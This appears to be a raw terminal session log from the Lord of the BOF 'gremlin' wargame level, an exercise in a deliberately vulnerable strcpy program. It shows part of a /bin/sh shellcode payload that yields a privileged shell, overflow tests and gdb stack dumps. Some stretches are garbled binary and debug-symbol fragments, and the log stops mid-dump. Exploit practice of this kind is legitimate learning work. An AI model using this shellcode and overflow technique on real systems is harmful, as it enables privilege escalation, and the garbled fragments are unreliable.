+\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80"+"\xd0\xfb\xff\xbf"'`
+1￐h//shh/bin⏓ኂ°
+               ̀ѻÿ¿
+bash$ id
+uid=500(gate) gid=500(gate) euid=501(gremlin) egid=501(gremlin) groups=500(gate)
+bash$ my-pass
+euid = 501
+hello bof world
+bash$ 
+Broadcast message from root (tty2) Sat Feb  3 02:01:40 2018...
+
+The system is going down for system halt NOW !!
+
+Connection closed by foreign host.
+
+Disconnected from remote host(192.168.56.128:23) at 02:03:48.
+
+Type `help' to learn how to use Xshell prompt.
+[c:\~]$ 
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+cobolt풀다가 gremlin다시풀음
+e/locale.hlconv:T(10,1)=s48decimal_point:(10,2)=*(0,2),0,32;thousands_sep:(10,2),32,32;\grouping:(10,2),64,32;int_curr_symbol:(10,2),96,32;\currency_symbol:(10,2),128,32;mon_decimal_point:(10,2),160,32;\mon_thousands_sep:(10,2),192,32;mon_grouping:(10,2),224,32;\positive_sign:(10,2),256,32;negative_sign:(10,2),288,32;\int_frac_digits:(0,2),320,8;frac_digits:(0,2),328,8;\p_cs_precedes:(0,2),336,8;p_sep_by_space:(0,2),344,8;\n_cs_precedes:(0,2),352,8;n_sep_by_space:(0,2),360,8;\p_sign_posn:(0,2),368,8;n_sign_posn:(0,2),376,8;;../include/xlocale.h../locale/xlocale.h__locale_struct:T(13,1)=s36__locales:(13,2)=ar(0,1);0;5;(13,3)=*(13,4)=xslocale_data:,0,192;\__ctype_b:(13,5)=*(0,9),192,32;__ctype_tolower:(13,6)=*(0,1),224,32;\__ctype_toupper:(13,6),256,32;;__locale_t:t(13,7)=(13,8)=*(13,1)../sysdeps/unix/sysv/linux/_G_config.h../sysdeps/unix/sysv/linux/bits/types.hsize_t:t(16,1)=(0,4)__u_char:t(15,1)=(0,11)__u_short:t(15,2)=(0,9)__u_int:t(15,3)=(0,4)__u_long:t(15,4)=(0,5)__u_quad_t:t(15,5)=(0,7)__quad_t:t(15,6)=(0,6)__int8_t:t(15,7)=(0,10)__uint8_t:t(15,8)=(0,11)__int16_t:t(15,9)=(0,8)__uint16_t:t(15,10)=(0,9)__int32_t:t(15,11)=(0,1)__uint32_t:t(15,12)=(0,4)__int64_t:t(15,13)=(0,6)__uint64_t:t(15,14)=(0,7)__qaddr_t:t(15,15)=(15,16)=*(15,6)__dev_t:t(15,17)=(15,5)__uid_t:t(15,18)=(15,3)__gid_t:t(15,19)=(15,3)__ino_t:t(15,20)=(15,4)__mode_t:t(15,21)=(15,3)__nlink_t:t(15,22)=(15,3)__off_t:t(15,23)=(0,3)__loff_t:t(15,24)=(15,6)__pid_t:t(15,25)=(0,1)__ssize_t:t(15,26)=(0,1)__rlim_t:t(15,27)=(0,3)__rlim64_t:t(15,28)=(15,6)__id_t:t(15,29)=(15,3)__fsid_t:t(15,30)=(15,31)=s8__val:(15,32)=ar(0,1);0;1;(0,1),0,64;;__daddr_t:t(15,33)=(0,1)__caddr_t:t(15,34)=(10,2)__time_t:t(15,35)=(0,3)__swblk_t:t(15,36)=(0,3)__clock_t:t(15,37)=(0,3)__fd_mask:t(15,38)=(0,5)__fd_set:t(15,39)=(15,40)=s128fds_bits:(15,41)=ar(0,1);0;31;(15,38),0,1024;;__key_t:t(15,42)=(0,1)__ipc_pid_t:t(15,43)=(0,9)__blkcnt_t:t(15,44)=(0,3)__blkcnt64_t:t(15,45)=(15,6)__fsblkcnt_t:t(15,46)=(15,4)__fsblkcnt64_t:t(15,47)=(15,5)__fsfilcnt_t:t(15,48)=(15,4)__fsfilcnt64_t:t(15,49)=(15,5)__ino64_t:t(15,50)=(15,4)__off64_t:t(15,51)=(15,24)__t_scalar_t:t(15,52)=(0,3)__t_uscalar_t:t(15,53)=(0,5)__intptr_t:t(15,54)=(0,1)../linuxthreads/sysdeps/pthread/bits/pthreadtypes.h../sysdeps/unix/sysv/linux/bits/sched.h__sched_param:T(18,1)=s4sched_priority:(0,1),0,32;;_pthread_fastlock:T(17,1)=s8__status:(0,3),0,32;__spinlock:(0,1),32,32;;_pthread_descr:t(17,2)=(17,3)=*(17,4)=xs_pthread_descr_struct:pthread_attr_t:t(17,5)=(17,6)=s36__detachstate:(0,1),0,32;\__schedpolicy:(0,1),32,32;__schedparam:(18,1),64,32;\__inheritsched:(0,1),96,32;__scope:(0,1),128,32;\__guardsize:(16,1),160,32;__stackaddr_set:(0,1),192,32;\__stackaddr:(17,7)=*(0,19),224,32;__stacksize:(16,1),256,32;;pthread_cond_t:t(17,8)=(17,9)=s12__c_lock:(17,1),0,64;\__c_waiting:(17,2),64,32;;pthread_condattr_t:t(17,10)=(17,11)=s4__dummy:(0,1),0,32;;pthread_key_t:t(17,12)=(0,4)pthread_mutex_t:t(17,13)=(17,14)=s24__m_reserved:(0,1),0,32;\__m_count:(0,1),32,32;__m_owner:(17,2),64,32;\__m_kind:(0,1),96,32;__m_lock:(17,1),128,64;;pthread_mutexattr_t:t(17,15)=(17,16)=s4__mutexkind:(0,1),0,32;;pthread_once_t:t(17,17)=(0,1)_pthread_rwlock_t:T(17,18)=s32__rw_lock:(17,1),0,64;__rw_readers:(0,1),64,32;\__rw_writer:(17,2),96,32;__rw_read_waiting:(17,2),128,32;\__rw_write_waiting:(17,2),160,32;__rw_kind:(0,1),192,32;\__rw_pshared:(0,1),224,32;;pthread_rwlock_t:t(17,19)=(17,18)pthread_rwlockattr_t:t(17,20)=(17,21)=s8__lockkind:(0,1),0,32;\__pshared:(0,1),32,32;;pthread_t:t(17,22)=(0,5)wchar_t:t(19,1)=(0,3)wint_t:t(19,2)=(0,4)_G_int16_t:t(14,1)=(0,8)_G_int32_t:t(14,2)=(0,1)_G_uint16_t:t(14,3)=(0,9)_G_uint32_t:t(14,4)=(0,4)_IO_stdin_used:G(0,1)GCC: (GNU) egcs-2.91.66 19990314/Linux (egcs-1.1.2 release)GCC: (GNU) egcs-2.91.66 19990314/Linux (egcs-1.1.2 release)GCC: (GNU) egcs-2.91.66 19990314/Linux (egcs-1.1.2 release)GCC: (GNU) egcs-2.91.66 19990314/Linux (egcs-1.1.2 release)GCC: (GNU) egcs-2.91.66 19990314/Linux (egcs-1.1.2 release)GCC: (GNU) egcs-2.91.66 19990314/Linux (egcs-1.1.2 release01.001.001.001.001.001.01.symtab.strtab.shstrtab.interp.note.ABI-tag.hash.dynsym.dynstr.gnu.version.gnu.version_r.rel.got.rel.plt.init.plt.text.fini.rodata.data.eh_frame.ctors.dtors.got.dynamic.bss.stab.stabstr.comment.(87e 
+                                                    `ᄁGÿÿÿovTþÿÿ c     l¨       °0 
+                                                                                 <¼ք 
+                                                                                (֘Áؕא 䢁 
+Oҁw 㠸]"࿁Ƨ9 °¨v`,+                                                                  Ƀ(                                                                                                        
+                                                                                                                                                                                         ؕ8     
+؄                                                                                                                                                                                            ¼ 
+                                                                                                                                                                                       
+                                                                                                                                                                                       
+                                                                                                                                                                                  K°  
+                                                                                                                                                                                   t
+                                                                                                                                                                                  ؕ 
+                                                                                                                                                                                  
+                                                                                                                                                                               " 
+                                                                                                                                                                                 
+                                                                                                                                                                                » 
+                                                                                                                                                                                ´ 
+                                                                                                                                                                                 
+                                                                                                                                                                               .. 
+                                                                                                                                                                                ＄ 
+
+                                                                                                                                                                                ⽰ 
+                                                                                                                                                                                8 
+                                                                                                                                                                                푁t"4; 
+A¢"d 
+   ؕT 
+¼..ଁ܄   ¤)¶¼ 
+ "initfini.cgcc2_compiled.init.ccrtstuff.cp.2__DTOR_LIST__completed.3__do_global_dtors_aux__EH_FRAME_BEGIN__fini_dummyobject.8frame_dummyinit_dummyforce_to_data__CTOR_LIST____do_global_ctors_aux__CTOR_END____DTOR_END____FRAME_END__gremlin.c_DYNAMIC_etext__register_frame_info@@GLIBC_2.0_fp_hw_init__deregister_frame_info@@GLIBC_2.0_start__bss_startmain__libc_start_main@@GLIBC_2.0da[gate@localhost gate]$ XshellXshellXshellXshellXshellXshellXshellXshellXshellXshellXshellXshellXshellXshellXshellXshellXshellXshellXshellXshellXshellXshellXshellXshellXshellXshellXshellXshellafsdfasfasf
+bash: XshellXshellXshellXshellXshellXshellXshellXshellXshellXshellXshellXshellXshellXshellXshellXshellXshellXshellXshellXshellXshellXshellXshellXshellXshellXshellXshellXshellafsdfasfasf: command not found
+[gate@localhost gate]$ cat gremlin.c
+/*
+	The Lord of the BOF : The Fellowship of the BOF 
+	- gremlin
+	- simple BOF
+*/
+ 
+int main(int argc, char *argv[])
+{
+    char buffer[256];
+    if(argc < 2){
+        printf("argv error\n");
+        exit(0);
+    }
+    strcpy(buffer, argv[1]);
+    printf("%s\n", buffer);
+}
+[gate@localhost gate]$ ls
+gremlin  gremlin.c
+[gate@localhost gate]$ cp gremlim
+cp: missing destination file
+Try `cp --help' for more information.
+[gate@localhost gate]$ cp gremlin gremlin
+cp: `gremlin' and `gremlin' are the same file
+[gate@localhost gate]$ cp gremlin gremlim
+[gate@localhost gate]$ ls
+gremlim  gremlin  gremlin.c
+[gate@localhost gate]$ ./gremlim asdf
+asdf
+[gate@localhost gate]$ ./gremlim `python -c 'print"A"*256'`
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+[gate@localhost gate]$ ./gremlim `python -c 'print"A"*257'`
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+[gate@localhost gate]$ ./gremlim `python -c 'print"A"*258'`
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+[gate@localhost gate]$ ./gremlim `python -c 'print"A"*259'`
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+[gate@localhost gate]$ ./gremlim `python -c 'print"A"*260'`
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+Segmentation fault (core dumped)
+[gate@localhost gate]$ gdb -c core
+GNU gdb 19991004
+Copyright 1998 Free Software Foundation, Inc.
+GDB is free software, covered by the GNU General Public License, and you are
+welcome to change it and/or distribute copies of it under certain conditions.
+Type "show copying" to see the conditions.
+There is absolutely no warranty for GDB.  Type "show warranty" for details.
+This GDB was configured as "i386-redhat-linux".
+Core was generated by `./gremlim AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'.
+Program terminated with signal 11, Segmentation fault.
+#0  0x40030902 in ?? ()
+(gdb) x/50 $esp
+0xbffffa50:	0x00000002	0xbffffa94	0xbffffaa0	0x40013868
+0xbffffa60:	0x00000002	0x08048380	0x00000000	0x080483a1
+0xbffffa70:	0x08048430	0x00000002	0xbffffa94	0x080482e0
+0xbffffa80:	0x080484bc	0x4000ae60	0xbffffa8c	0x40013e90
+0xbffffa90:	0x00000002	0xbffffb8a	0xbffffb99	0x00000000
+0xbffffaa0:	0xbffffc9e	0xbffffcc0	0xbffffcca	0xbffffcd8
+0xbffffab0:	0xbffffcf7	0xbffffd04	0xbffffd1c	0xbffffd36
+0xbffffac0:	0xbffffd41	0xbffffd4f	0xbffffd8f	0xbffffd9f
+0xbffffad0:	0xbffffdb4	0xbffffdc4	0xbffffdce	0xbffffdea
+0xbffffae0:	0xbffffe03	0xbffffe0e	0xbffffe1b	0xbffffe23
+0xbffffaf0:	0xbfffffe6	0x00000000	0x00000003	0x08048034
+0xbffffb00:	0x00000004	0x00000020	0x00000005	0x00000006
+0xbffffb10:	0x00000006	0x00001000
+(gdb) 
+0xbffffb18:	0x00000007	0x40000000	0x00000008	0x00000000
+0xbffffb28:	0x00000009	0x08048380	0x0000000b	0x000001f4
+0xbffffb38:	0x0000000c	0x000001f4	0x0000000d	0x000001f4
+0xbffffb48:	0x0000000e	0x000001f4	0x00000010	0x0fabfbff
+0xbffffb58:	0x0000000f	0xbffffb8a	0x00000000	0x00000000
+0xbffffb68:	0x00000000	0x00000000	0x00000000	0x00000000
+0xbffffb78:	0x00000000	0x00000000	0x00000000	0x00000000
+0xbffffb88:	0x36690000	0x2e003638	0x6572672f	0x6d696c6d
+0xbffffb98:	0x41414100	0x41414141	0x41414141	0x41414141
+0xbffffba8:	0x41414141	0x41414141	0x41414141	0x41414141
+0xbffffbb8:	0x41414141	0x41414141	0x41414141	0x41414141
+0xbffffbc8:	0x41414141	0x41414141	0x41414141	0x41414141
+0xbffffbd8:	0x41414141	0x41414141
+(gdb) 
+0xbffffbe0:	0x41414141	0x41414141	0x41414141	0x41414141
+0xbffffbf0:	0x41414141	0x41414141	0x41414141	0x41414141
+0xbffffc00:	0x41414141	0x41414141	0x41414141	0x41414141
+0xbffffc10:	0x41414141	0x41414141	0x41414141	0x41414141
+0xbffffc20:	0x41414141	0x41414141	0x41414141	0x41414141
+0xbffffc30:	0x41414141	0x41414141	0x41414141	0x41414141
+0xbffffc40:	0x41414141	0x41414141	0x41414141	0x41414141
+0xbffffc50:	0x41414141	0x41414141	0x41414141	0x41414141
+0xbffffc60:	0x41414141	0x41414141	0x41414141	0x41414141
+0xbffffc70:	0x41414141	0x41414141	0x41414141	0x41414141
+0xbffffc80:	0x41414141	0x41414141	0x41414141	0x41414141
+0xbffffc90:	0x41414141	0x41414141	0x41414141	0x454c0041
+0xbffffca0:	0x504f5353	0x7c3d4e45
+(gdb) 
+0xbffffca8:	0x7273752f	0x6e69622f	0x73656c2f	0x70697073
+0xbffffcb8:	0x68732e65	0x00732520	0x52455355	0x454d414e
+0xbffffcc8:	0x4948003d	0x49535453	0x313d455a	0x00303030
+0xbffffcd8:	0x54534f48	0x454d414e	0x636f6c3d	0x6f686c61
+0xbffffce8:	0x6c2e7473	0x6c61636f	0x616d6f64	0x4c006e69
+0xbffffcf8:	0x414e474f	0x673d454d	0x00657461	0x4f4d4552
+0xbffffd08:	0x4f484554	0x313d5453	0x312e3239	0x352e3836
+0xbffffd18:	0x00312e36	0x4c49414d	0x61762f3d	0x70732f72
+0xbffffd28:	0x2f6c6f6f	0x6c69616d	0x7461672f	0x45540065
+0xbffffd38:	0x783d4d52	0x6d726574	0x534f4800	0x50595454
+0xbffffd48:	0x33693d45	0x50003638	0x3d485441	0x7273752f
+0xbffffd58:	0x636f6c2f	0x622f6c61	0x2f3a6e69	0x3a6e6962
+0xbffffd68:	0x7273752f	0x6e69622f
+(gdb) 
+0xbffffd70:	0x73752f3a	0x31582f72	0x2f365231	0x3a6e6962
+0xbffffd80:	0x6d6f682f	0x61672f65	0x622f6574	0x48006e69
+0xbffffd90:	0x3d454d4f	0x6d6f682f	0x61672f65	0x49006574
+0xbffffda0:	0x5455504e	0x2f3d4352	0x2f637465	0x75706e69
+0xbffffdb0:	0x00637274	0x4c454853	0x622f3d4c	0x622f6e69
+0xbffffdc0:	0x00687361	0x52455355	0x7461673d	0x41420065
+0xbffffdd0:	0x455f4853	0x2f3d564e	0x656d6f68	0x7461672f
+0xbffffde0:	0x622e2f65	0x72687361	0x49440063	0x414c5053
+0xbffffdf0:	0x39313d59	0x36312e32	0x36352e38	0x303a312e
+0xbffffe00:	0x4c00302e	0x3d474e41	0x555f6e65	0x534f0053
+0xbffffe10:	0x45505954	0x6e694c3d	0x53007875	0x4c564c48
+0xbffffe20:	0x4c00313d	0x4f435f53	0x53524f4c	0x3d6f6e3d
+0xbffffe30:	0x663a3030	0x30303d69
+(gdb) 
+0xbffffe38:	0x3d69643a	0x333b3130	0x6e6c3a34	0x3b31303d
+0xbffffe48:	0x703a3633	0x30343d69	0x3a33333b	0x303d6f73
+0xbffffe58:	0x35333b31	0x3d64623a	0x333b3034	0x31303b33
+0xbffffe68:	0x3d64633a	0x333b3034	0x31303b33	0x3d726f3a
+0xbffffe78:	0x303b3130	0x37333b35	0x3a31343b	0x303d696d
+0xbffffe88:	0x35303b31	0x3b37333b	0x653a3134	0x31303d78
+0xbffffe98:	0x3a32333b	0x6d632e2a	0x31303d64	0x3a32333b
+0xbffffea8:	0x78652e2a	0x31303d65	0x3a32333b	0x6f632e2a
+0xbffffeb8:	0x31303d6d	0x3a32333b	0x74622e2a	0x31303d6d
+0xbffffec8:	0x3a32333b	0x61622e2a	0x31303d74	0x3a32333b
+0xbffffed8:	0x68732e2a	0x3b31303d	0x2a3a3233	0x6873632e
+0xbffffee8:	0x3b31303d	0x2a3a3233	0x7261742e	0x3b31303d
+0xbffffef8:	0x2a3a3133	0x7a67742e
+(gdb) 
+0xbfffff00:	0x3b31303d	0x2a3a3133	0x6a72612e	0x3b31303d
+0xbfffff10:	0x2a3a3133	0x7a61742e	0x3b31303d	0x2a3a3133
+0xbfffff20:	0x687a6c2e	0x3b31303d	0x2a3a3133	0x70697a2e
+0xbfffff30:	0x3b31303d	0x2a3a3133	0x303d7a2e	0x31333b31
+0xbfffff40:	0x5a2e2a3a	0x3b31303d	0x2a3a3133	0x3d7a672e
+0xbfffff50:	0x333b3130	0x2e2a3a31	0x3d327a62	0x333b3130
+0xbfffff60:	0x2e2a3a31	0x303d7a62	0x31333b31	0x742e2a3a
+0xbfffff70:	0x31303d7a	0x3a31333b	0x70722e2a	0x31303d6d
+0xbfffff80:	0x3a31333b	0x70632e2a	0x303d6f69	0x31333b31
+0xbfffff90:	0x6a2e2a3a	0x303d6770	0x35333b31	0x672e2a3a
+0xbfffffa0:	0x303d6669	0x35333b31	0x622e2a3a	0x303d706d
+0xbfffffb0:	0x35333b31	0x782e2a3a	0x303d6d62	0x35333b31
+0xbfffffc0:	0x782e2a3a	0x303d6d70
+(gdb) 
+0xbfffffc8:	0x35333b31	0x702e2a3a	0x303d676e	0x35333b31
+0xbfffffd8:	0x742e2a3a	0x303d6669	0x35333b31	0x3d5f003a
+0xbfffffe8:	0x72672f2e	0x696c6d65	0x2f2e006d	0x6d657267
+0xbffffff8:	0x006d696c	0x00000000	Cannot access memory at address 0xc0000000
+(gdb) 
+0xc0000004:	Cannot access memory at address 0xc0000004
+(gdb) 
+0xc0000008:	Cannot access memory at address 0xc0000008
+(gdb) 
+0xc000000c:	Cannot access memory at address 0xc000000c
+(gdb) 
+0xc0000010:	Cannot access memory at address 0xc0000010
+(gdb) x/100 $esp
+0xbffffa50:	0x00000002	0xbffffa94	0xbffffaa0	0x40013868
+0xbffffa60:	0x00000002	0x08048380	0x00000000	0x080483a1
+0xbffffa70:	0x08048430	0x00000002	0xbffffa94	0x080482e0
+0xbffffa80:	0x080484bc	0x4000ae60	0xbffffa8c	0x40013e90
+0xbffffa90:	0x00000002	0xbffffb8a	0xbffffb99	0x00000000
+0xbffffaa0:	0xbffffc9e	0xbffffcc0	0xbffffcca	0xbffffcd8
+0xbffffab0:	0xbffffcf7	0xbffffd04	0xbffffd1c	0xbffffd36
+0xbffffac0:	0xbffffd41	0xbffffd4f	0xbffffd8f	0xbffffd9f
+0xbffffad0:	0xbffffdb4	0xbffffdc4	0xbffffdce	0xbffffdea
+0xbffffae0:	0xbffffe03	0xbffffe0e	0xbffffe1b	0xbffffe23
+0xbffffaf0:	0xbfffffe6	0x00000000	0x00000003	0x08048034
+0xbffffb00:	0x00000004	0x00000020	0x00000005	0x00000006
+0xbffffb10:	0x00000006	0x00001000	0x00000007	0x40000000
+0xbffffb20:	0x00000008	0x00000000	0x00000009	0x08048380
+0xbffffb30:	0x0000000b	0x000001f4	0x0000000c	0x000001f4
+0xbffffb40:	0x0000000d	0x000001f4	0x0000000e	0x000001f4
+0xbffffb50:	0x00000010	0x0fabfbff	0x0000000f	0xbffffb8a
+0xbffffb60:	0x00000000	0x00000000	0x00000000	0x00000000
+0xbffffb70:	0x00000000	0x00000000	0x00000000	0x00000000
+0xbffffb80:	0x00000000	0x00000000	0x36690000	0x2e003638
+0xbffffb90:	0x6572672f	0x6d696c6d	0x41414100	0x41414141
+0xbffffba0:	0x41414141	0x41414141	0x41414141	0x41414141
+0xbffffbb0:	0x41414141	0x41414141	0x41414141	0x41414141
+0xbffffbc0:	0x41414141	0x41414141	0x41414141	0x41414141
+0xbffffbd0:	0x41414141	0x41414141	0x41414141	0x41414141
+(gdb) 
+0xbffffbe0:	0x41414141	0x41414141	0x41414141	0x41414141
+0xbffffbf0:	0x41414141	0x41414141	0x41414141	0x41414141
+0xbffffc00:	0x41414141	0x41414141	0x41414141	0x41414141
+0xbffffc10:	0x41414141	0x41414141	0x41414141	0x41414141
+0xbffffc20:	0x41414141	0x41414141	0x41414141	0x41414141
+0xbffffc30:	0x41414141	0x41414141	0x41414141	0x41414141
+0xbffffc40:	0x41414141	0x41414141	0x41414141	0x41414141
+0xbffffc50:	0x41414141	0x41414141	0x41414141	0x41414141
+0xbffffc60:	0x41414141	0x41414141	0x41414141	0x41414141
+0xbffffc70:	0x41414141	0x41414141	0x41414141	0x41414141
+0xbffffc80:	0x41414141	0x41414141	0x41414141	0x41414141
+0xbffffc90:	0x41414141	0x41414141	0x41414141	0x454c0041
+0xbffffca0:	0x504f5353	0x7c3d4e45	0x7273752f	0x6e69622f
+0xbffffcb0:	0x73656c2f	0x70697073	0x68732e65	0x00732520
+0xbffffcc0:	0x52455355	0x454d414e	0x4948003d	0x49535453
+0xbffffcd0:	0x313d455a	0x00303030	0x54534f48	0x454d414e
+0xbffffce0:	0x636f6c3d	0x6f686c61	0x6c2e7473	0x6c61636f
+0xbffffcf0:	0x616d6f64	0x4c006e69	0x414e474f	0x673d454d
+0xbffffd00:	0x00657461	0x4f4d4552	0x4f484554	0x313d5453
+0xbffffd10:	0x312e3239	0x352e3836	0x00312e36	0x4c49414d
+0xbffffd20:	0x61762f3d	0x70732f72	0x2f6c6f6f	0x6c69616d
+0xbffffd30:	0x7461672f	0x45540065	0x783d4d52	0x6d726574
+0xbffffd40:	0x534f4800	0x50595454	0x33693d45	0x50003638
+0xbffffd50:	0x3d485441	0x7273752f	0x636f6c2f	0x622f6c61
+0xbffffd60:	0x2f3a6e69	0x3a6e6962	0x7273752f	0x6e69622f
+(gdb) q
+[gate@localhost gate]$ gdb gremlim
+GNU gdb 19991004
+Copyright 1998 Free Software Foundation, Inc.
+GDB is free software, covered by the GNU General Public License, and you are
+welcome to change it and/or distribute copies of it under certain conditions.
+Type "show copying" to see the conditions.
+There is absolutely no warranty for GDB.  Type "show warranty" for details.
+This GDB was configured as "i386-redhat-linux"...
+(gdb) r asdf
+Starting program: /home/gate/gremlim asdf
+asdf
+
+Program exited with code 05.
+(gdb) disas main
+Dump of assembler code for function main:
+0x8048430 <main>:	push   %ebp
+0x8048431 <main+1>:	mov    %esp,%ebp
+0x8048433 <main+3>:	sub    $0x100,%esp
+0x8048439 <main+9>:	cmpl   $0x1,0x8(%ebp)
+0x804843d <main+13>:	jg     0x8048456 <main+38>
+0x804843f <main+15>:	push   $0x80484e0
+0x8048444 <main+20>:	call   0x8048350 <printf>
+0x8048449 <main+25>:	add    $0x4,%esp
+0x804844c <main+28>:	push   $0x0
+0x804844e <main+30>:	call   0x8048360 <exit>
+0x8048453 <main+35>:	add    $0x4,%esp
+0x8048456 <main+38>:	mov    0xc(%ebp),%eax
+0x8048459 <main+41>:	add    $0x4,%eax
+0x804845c <main+44>:	mov    (%eax),%edx
+0x804845e <main+46>:	push   %edx
+0x804845f <main+47>:	lea    0xffffff00(%ebp),%eax
+0x8048465 <main+53>:	push   %eax
+0x8048466 <main+54>:	call   0x8048370 <strcpy>
+0x804846b <main+59>:	add    $0x8,%esp
+0x804846e <main+62>:	lea    0xffffff00(%ebp),%eax
+0x8048474 <main+68>:	push   %eax
+0x8048475 <main+69>:	push   $0x80484ec
+0x804847a <main+74>:	call   0x8048350 <printf>
+0x804847f <main+79>:	add    $0x8,%esp
+0x8048482 <main+82>:	leave  
+0x8048483 <main+83>:	ret    
+0x8048484 <main+84>:	nop    
+0x8048485 <main+85>:	nop    
+0x8048486 <main+86>:	nop    
+0x8048487 <main+87>:	nop    
+0x8048488 <main+88>:	nop    
+0x8048489 <main+89>:	nop    
+0x804848a <main+90>:	nop    
+0x804848b <main+91>:	nop    
+0x804848c <main+92>:	nop    
+0x804848d <main+93>:	nop    
+0x804848e <main+94>:	nop    
+0x804848f <main+95>:	nop    
+End of assembler dump.
+(gdb) b *main+59
+Breakpoint 1 at 0x804846b
+(gdb) q                          
+[gate@localhost gate]$ bash2
+[gate@localhost gate]$ gdb -q gremlim
+(gdb) i b
+No breakpoints or watchpoints.
+(gdb) b *main+59
+Breakpoint 1 at 0x804846b
+(gdb) r `python -c 'print"A"*256'`
+Starting program: /home/gate/gremlim `python -c 'print"A"*256'`
+
+Breakpoint 1, 0x804846b in main ()
+(gdb) x/50 $esp
+0xbffff910:	0xbffff918	0xbffffb6e	0x41414141	0x41414141
+0xbffff920:	0x41414141	0x41414141	0x41414141	0x41414141
+0xbffff930:	0x41414141	0x41414141	0x41414141	0x41414141
+0xbffff940:	0x41414141	0x41414141	0x41414141	0x41414141
+0xbffff950:	0x41414141	0x41414141	0x41414141	0x41414141
+0xbffff960:	0x41414141	0x41414141	0x41414141	0x41414141
+0xbffff970:	0x41414141	0x41414141	0x41414141	0x41414141
+0xbffff980:	0x41414141	0x41414141	0x41414141	0x41414141
+0xbffff990:	0x41414141	0x41414141	0x41414141	0x41414141
+0xbffff9a0:	0x41414141	0x41414141	0x41414141	0x41414141
+0xbffff9b0:	0x41414141	0x41414141	0x41414141	0x41414141
+0xbffff9c0:	0x41414141	0x41414141	0x41414141	0x41414141
+0xbffff9d0:	0x41414141	0x41414141
+(gdb) 
+0xbffff9d8:	0x41414141	0x41414141	0x41414141	0x41414141
+0xbffff9e8:	0x41414141	0x41414141	0x41414141	0x41414141
+0xbffff9f8:	0x41414141	0x41414141	0x41414141	0x41414141
+0xbffffa08:	0x41414141	0x41414141	0x41414141	0x41414141
+0xbffffa18:	0xbffffa00	0x400309cb	0x00000002	0xbffffa64
+0xbffffa28:	0xbffffa70	0x40013868	0x00000002	0x08048380
+0xbffffa38:	0x00000000	0x080483a1	0x08048430	0x00000002
+0xbffffa48:	0xbffffa64	0x080482e0	0x080484bc	0x4000ae60
+0xbffffa58:	0xbffffa5c	0x40013e90	0x00000002	0xbffffb5b
+0xbffffa68:	0xbffffb6e	0x00000000	0xbffffc6f	0xbffffc91
+0xbffffa78:	0xbffffc9b	0xbffffca9	0xbffffcc8	0xbffffcd5
+0xbffffa88:	0xbffffced	0xbffffd07	0xbffffd26	0xbffffd31
+0xbffffa98:	0xbffffd3f	0xbffffd7f
+(gdb) 
+0xbffffaa0:	0xbffffd8f	0xbffffda4	0xbffffdb4	0xbffffdbe
+0xbffffab0:	0xbffffdda	0xbffffdf3	0xbffffdfe	0xbffffe0f
+0xbffffac0:	0xbffffe1e	0xbffffe26	0x00000000	0x00000003
+0xbffffad0:	0x08048034	0x00000004	0x00000020	0x00000005
+0xbffffae0:	0x00000006	0x00000006	0x00001000	0x00000007
+0xbffffaf0:	0x40000000	0x00000008	0x00000000	0x00000009
+0xbffffb00:	0x08048380	0x0000000b	0x000001f4	0x0000000c
+0xbffffb10:	0x000001f4	0x0000000d	0x000001f4	0x0000000e
+0xbffffb20:	0x000001f4	0x00000010	0x0fabfbff	0x0000000f
+0xbffffb30:	0xbffffb56	0x00000000	0x00000000	0x00000000
+0xbffffb40:	0x00000000	0x00000000	0x00000000	0x00000000
+0xbffffb50:	0x00000000	0x36690000	0x2f003638	0x656d6f68
+0xbffffb60:	0x7461672f	0x72672f65
+(gdb) 
+0xbffffb68:	0x696c6d65	0x4141006d	0x41414141	0x41414141
+0xbffffb78:	0x41414141	0x41414141	0x41414141	0x41414141
